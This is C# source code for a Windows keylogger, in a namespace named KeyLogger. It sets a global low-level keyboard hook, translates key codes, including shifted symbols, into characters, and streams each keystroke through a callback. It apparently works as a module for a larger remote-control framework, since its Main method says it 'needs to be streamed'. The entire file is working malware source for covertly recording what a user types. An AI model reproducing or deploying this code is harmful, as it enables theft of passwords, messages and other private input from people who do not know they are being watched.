using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

namespace KeyLogger
{
    public class Program
    {

        static Dictionary<int, string> special = new Dictionary<int, string>()
        {
            { 8, "<bs>" },
            { 9, "  " },
            { 13, "<et>" },
            { 27, "<esc>" },
            { 32, " " },
            { 37, "<ra>" },
            { 38, "<ua>" },
            { 39, "<la>" },
            { 40, "<da>" },
            { 46, "<de>" },
            { 48, ")" },
            { 49, "!" },
            { 50, "@" },
            { 51, "#" },
            { 52, "$" },
            { 53, "%" },
            { 54, "^" },
            { 55, "&" },
            { 56, "*" },
            { 57, "(" },
            { 186, ";" },
            { 187, "=" },
            { 188, "," },
            { 189, "-" },
            { 190, "." },
            { 191, "/" },
            { 192, "`" },
            { 219, "[" },
            { 220, "\\" },
            { 221, "]" },
            { 222, "'" },
            { 286, "+" },
            { 287, ":" },
            { 288, "<" },
            { 289, "_" },
            { 290, ">" },
            { 291, "?" },
            { 292, "~" },
            { 319, "{" },
            { 320, "|" },
            { 321, "}" },
            { 322, "\"" },
        };

        static bool _running = true;
        static Func<object, Task> callback = null;
        public static int Main(string[] args)
        {

            Console.WriteLine("Module needs to be streamed");
            return 0;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        /*public static int Main(string[] args)
        {

            using (var input = new Input())
            {
                input.KeyPressed += Input_KeyPressed;
                Pause();
                input.KeyPressed -= Input_KeyPressed;
            }

            return 0;
        }*/

        public static void Stream(Func<object, Task> cb)
        {
            callback = cb;
            using (var input = new Input())
            {
                input.KeyPressed += Input_KeyPressed;
                Pause();
                input.KeyPressed -= Input_KeyPressed;
            }
        }

        private static void Input_KeyPressed(int vKey)
        {
            var isUpper = (((ushort)GetKeyState(0x14)) & 0xffff) != 0
                || GetKeyState(0xA0) < 0
                || GetKeyState(0xA1) < 0;

            var r = string.Empty;
            if (vKey >= 48 && vKey <= 57)
            {
                if (isUpper)
                {
                    r = special[vKey];
                }
                else
                {
                    r = ((char)vKey).ToString();
                }
            }
            else if (vKey >= 65 && vKey <= 90)
            {
                if (!isUpper) vKey += 32;
                r = ((char)vKey).ToString();
            }
            else if (vKey >= 186 && vKey <= 222)
            {
                if (isUpper) vKey += 100;
                if (special.ContainsKey(vKey))
                {
                    r = special[vKey];
                }
            }
            else
            {
                if (special.ContainsKey(vKey))
                {
                    r = special[vKey];
                }
            }

            if (r != string.Empty)
            {
                callback(new { output = HttpUtility.HtmlEncode(r), returnType = 11 });
            }
        }

        private static void Pause()
        {
            while (_running)
            {
                Thread.Sleep(100);
            }
        }
    }

    internal class GlobalHook : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public delegate IntPtr LowLevelProc(int nCode, int wParam, IntPtr lParam);

        public event EventHandler<int> OnKeyPressed;

        private LowLevelProc _keyboardProc;
        private IntPtr _keyboardHookId;

        public GlobalHook()
        {
            var modHandle = GetModuleHandle(null);
            SetKeyboardHook(modHandle);
        }

        public void Dispose()
        {
            if (_keyboardHookId != IntPtr.Zero) UnhookWindowsHookEx(_keyboardHookId);
        }

        private void SetKeyboardHook(IntPtr modHandle)
        {
            _keyboardProc = Keyboard_HookCallback;
            _keyboardHookId = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, modHandle, 0);
        }

        private IntPtr Keyboard_HookCallback(int nCode, int wParam, IntPtr lParam)
        {
            HandleMessage(nCode, wParam, lParam);
            return CallNextHookEx(_keyboardHookId, nCode, wParam, lParam);
        }

        private void HandleMessage(int nCode, int wParam, IntPtr lParam)
        {
            if (nCode < 0) return;

            if (wParam == WM_KEYDOWN)
            {
                var vkCode = Marshal.ReadInt32(lParam);
                OnKeyPressed?.Invoke(this, vkCode);
            }

        }

    }

    internal class MessagePump
    {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PeekMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);

        [DllImport("user32.dll")]
        private static extern bool TranslateMessage([In] ref MSG lpMsg);

        [DllImport("user32.dll")]
        private static extern IntPtr DispatchMessage([In] ref MSG lpmsg);

        private const int PM_REMOVE = 0x0001;

        private bool _isRunning;


        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            IntPtr hwnd;
            uint message;
            UIntPtr wParam;
            IntPtr lParam;
            int time;
        }

        public void Start()
        {
            _isRunning = true;
            StartMessagePump();
        }

        public void Stop()
        {
            _isRunning = false;
        }

        private void StartMessagePump()
        {
            while (_isRunning)
            {
                var foundMessage = PeekMessage(out MSG msg, IntPtr.Zero, 0, 0, PM_REMOVE);
                if (foundMessage)
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }
                else
                {
                    Thread.Sleep(1);
                }

            }
        }
    }

    internal class Input : IDisposable
    {
        private Thread _pumpThread;
        private MessagePump _pump;

        public delegate void KeyPressedHandler(int vKey);

        public event KeyPressedHandler KeyPressed;

        public Input()
        {
            _pumpThread = new Thread(StartMessagePumpThread);
            _pumpThread.Start();
        }

        private void StartMessagePumpThread()
        {
            _pump = new MessagePump();
            using (var hook = new GlobalHook())
            {
                hook.OnKeyPressed += Hook_OnKeyPressed;
                _pump.Start();
                hook.OnKeyPressed -= Hook_OnKeyPressed;
            }
        }

        private void Hook_OnKeyPressed(object sender, int key)
        {
            KeyPressed?.Invoke(key);
        }

        public void Dispose()
        {
            if (_pump == null) return;
            _pump.Stop();
        }
    }
}
